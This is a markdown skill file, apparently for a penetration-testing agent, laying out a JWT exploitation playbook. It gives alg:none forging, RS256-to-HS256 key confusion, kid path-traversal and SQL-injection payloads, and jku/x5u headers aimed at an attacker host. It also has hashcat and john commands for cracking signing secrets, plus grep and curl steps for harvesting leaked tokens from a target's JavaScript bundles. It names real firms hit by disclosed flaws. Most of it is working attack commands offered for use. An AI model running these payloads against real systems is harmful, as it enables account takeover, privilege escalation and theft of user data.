---
name: "JWT Attacks"
description: "Forge, tamper, and bypass JSON Web Token authentication: alg:none, RS256->HS256 key confusion, kid/jku/x5u/jwk header abuse, and claim manipulation. Deterministic forged-vs-legit differential proof."
tags: ["jwt", "auth_bypass", "ssrf"]
recommended_tools: ["jwt_tool", "python3 (PyJWT)", "curl", "interactsh-client"]
vuln_classes: ["jwt", "auth_bypass", "ssrf"]
domain: web
phase: exploitation
---
# JWT Attacks

Forge/tamper JWTs to impersonate users or escalate to admin. Maps to vuln_classes: jwt, auth_bypass, ssrf (jku/x5u key-fetch).

## Where to look
- `Authorization: Bearer eyJ...`, cookies named `jwt`/`token`/`access_token`/`id_token`, `?token=eyJ...`.
- Pull the verifier's published keys: `GET /.well-known/openid-configuration` -> `jwks_uri` -> `GET <jwks_uri>`.
- Decode header+payload (base64url) and note: `alg`, `kid`, presence of `jku`/`x5u`/`jwk`, and which claims carry identity (`sub` vs `email`/`role`/`isAdmin`).

## Payload ladder: detect -> confirm -> escalate

### 1. alg:none signature stripping
Set header `{"alg":"none"}` (try `none`/`None`/`NONE`/`nOnE`), mutate a claim (`sub`->admin, `role`->admin), drop the signature segment (keep the trailing dot).
```
jwt_tool eyJ... -X a
```
Confirm differential: send the alg:none token AND a token with a BOGUS HS256 signature.
- alg:none -> 2xx + elevated identity, bogus-sig -> 401/403  => server accepts unsigned tokens.

### 2. RS256 -> HS256 key confusion
If the server publishes an RSA public key (JWKS) but the verify code is alg-agnostic, sign an HS256 token using the PUBLIC KEY PEM TEXT as the HMAC secret.
```
jwt_tool eyJ... -X k -pk public.pem
# or PyJWT: jwt.encode(payload, open('public.pem').read(), algorithm='HS256')
```

### 3. kid header abuse
```
Path traversal: "kid":"../../../../dev/null"   -> signing key is HMAC("")  -> sign with empty secret
SQLi in kid:    "kid":"x' UNION SELECT 'AAAA'-- "  -> control the returned key bytes
File read:      "kid":"/etc/passwd" or a predictable static file used as key
```

### 4. jku / x5u / jwk header injection (also SSRF)
If the verifier fetches signing keys from a URL in the token header, point it at an attacker host serving your own key, sign with your private key, and rewrite claims to admin.
```
header: {"alg":"RS256","jku":"https://attacker.tld/jwks.json"}
header: {"alg":"RS256","x5u":"https://attacker.tld/cert.pem"}
header: {"alg":"RS256","jwk":{...embedded attacker public key...}}
payload: {"role":"admin","isAdmin":true}
```
Use an `{OAST}` host for the jku/x5u URL to also confirm the SSRF fetch via callback.

### 5. Claim-validation gaps (cleanest win)
Many verifiers check the signature but skip `aud`/`iss`/`exp`/`typ`. Replay a valid token with: expired `exp`, swapped `aud`, mismatched `iss`, or an unrelated service's token. Also test `b64=false` JWS: `{"b64":false,"crit":["b64"]}` with an unencoded payload.

## Tooling
```
jwt_tool eyJ... -M at                                  # all-tests scan
jwt_tool -t https://target/api/me -rh "Authorization: Bearer eyJ..." -M at
jwt_tool eyJ... -X k -pk public.pem                    # RS256->HS256
```

## Deterministic proof signal
Capture TWO requests — legit token and forged token — to the SAME protected endpoint. Forged token returns HTTP 200 with owner-equivalent OR other-user/admin-shape data (body contains `"role":"admin"`/`"isAdmin":true`/another user's email) while the baseline non-permitted actor still gets 401/403. For jku/x5u, also require an OAST callback to the attacker key host. `Token accepted` alone is insufficient — the response body must prove elevated identity.

## Chaining
- jku/x5u SSRF -> internal key-fetch / cloud metadata.
- Forged admin JWT -> BFLA admin endpoints (route to access-control-testing).
- nOAuth email-keyed identity confusion -> route to authentication-testing.

CWE-347 (Improper Verification of Cryptographic Signature), CWE-345, CWE-287.

## Modern techniques & real-world CVEs (via recon-skills)

### Weak HMAC secret brute force (HS256/384/512)
Signature confidentiality is not integrity — if the app uses a guessable HS secret you can forge arbitrary claims. Prefer GPU cracking; fall back to Python for a quick top-list pass.
```bash
# hashcat: mode 16500 = JWT. Feed the whole token.
hashcat -a 0 -m 16500 token.jwt /usr/share/wordlists/rockyou.txt
# also try rules and the classic devsecret wordlist:
hashcat -a 0 -m 16500 token.jwt jwt.secrets.list -r best64.rule
# john:
echo "$JWT" > token.jwt && john --format=HMAC-SHA256 --wordlist=rockyou.txt token.jwt
```
Fast inline confirmation of a candidate secret (no external tooling):
```bash
python3 - "$JWT" 'secret' <<'PY'
import sys,hmac,hashlib,base64
jwt,secret=sys.argv[1],sys.argv[2].encode()
h,p,s=jwt.split('.')
sig=base64.urlsafe_b64encode(hmac.new(secret,f'{h}.{p}'.encode(),hashlib.sha256).digest()).rstrip(b'=').decode()
print('MATCH' if sig==s else 'no')
PY
```
Common weak secrets seen in the wild: `secret`, `jwt_secret`, `changeme`, `your-256-bit-secret`, `app_secret`, framework defaults. Once cracked, re-sign a payload with elevated claims and re-verify against a protected endpoint (differential proof, not "token accepted").

### Expired-token / missing `exp` reuse
Many verifiers check the signature but never enforce `exp`/`nbf`. Decode the payload and flag:
- `exp` absent → token is effectively permanent.
- `exp` far in the future (multi-year sessions) → durable account takeover if the token leaks.

Replay an expired-but-valid token unchanged; if the protected endpoint still returns 2xx with owner data, `exp` validation is disabled (CWE-613).
```bash
python3 - "$JWT" <<'PY'
import sys,base64,json,time
p=sys.argv[1].split('.')[1]; p+='='*(-len(p)%4)
d=json.loads(base64.urlsafe_b64decode(p))
exp=d.get('exp')
print('NO EXP - permanent' if exp is None else
      f'exp in {(exp-time.time())/86400:.0f}d' if exp>time.time() else 'EXPIRED (test reuse anyway)')
PY
```

### Hardcoded / leaked JWTs and signing secrets in client assets
Before forging anything, grep client-side sources — a live token or the raw signing secret is often shipped to the browser. This is the highest-yield, lowest-effort path.
```bash
# tokens embedded in JS/HTML/env bundles
grep -rniE 'eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.' ./dist ./build
# signing secret leaked in Vite/webpack source or env files
grep -rniE 'jwt[_-]?secret|token[_-]?secret|signing[_-]?key' ./src .env* dist
# pull sourcemaps / env chunks the SPA loads, then re-grep
curl -s https://target/assets/index-*.js | grep -oE 'eyJ[A-Za-z0-9_.-]{20,}'
```
Disclosed real-world outcomes (recon-skills):
- **CGE-RJ** — `JWT_SECRET` hardcoded in Vite `src/env.ts`; HS256 with that secret let attackers forge any token against a CNPJ database API (~1.9M records).
- **Brendi** — live HS256 JWTs baked into the WhatsApp-bot and dashboard JS bundles, both valid for the BFF API reading PII from Firestore.
- **Core3 / Efí Bank** — `proxy-efi-simple.php` logged 315 valid JWTs (minted from an mTLS cert) into a world-readable `efi-simple.log`.
- **Smart Fit** — admin JWT sessions with `exp` set to 2027 (multi-year takeover window).

Any leaked token must be validated against the live API before reporting — many rotate or are `jti`-bound.

### Library-specific validation gotchas
- **Laravel Passport** binds tokens to a DB row via `jti` — a cryptographically valid forgery still fails unless the `jti` exists server-side. Prioritize secret/key leaks over pure forgery here.
- **Auth0 / Firebase / Cognito** always verify with a JWKS public key (RS256), so `alg:none` and HS-secret brute force are dead ends — pivot to key-confusion, `kid`/`jku` abuse, or claim-validation gaps (`aud`/`iss`) instead.
- **Node `jsonwebtoken` < 9.0.0** (and similar) accept alg mismatches when `algorithms` is not pinned — the enabler for RS256→HS256 confusion.

### crit / b64 header edge cases
Beyond the standard ladder, probe deserialization/parser quirks: duplicate JSON keys in header/payload (parsers may read different ones on sign vs verify), and unrecognized `crit` header entries that some verifiers ignore instead of rejecting — either can flip a "must reject" into "accepted."
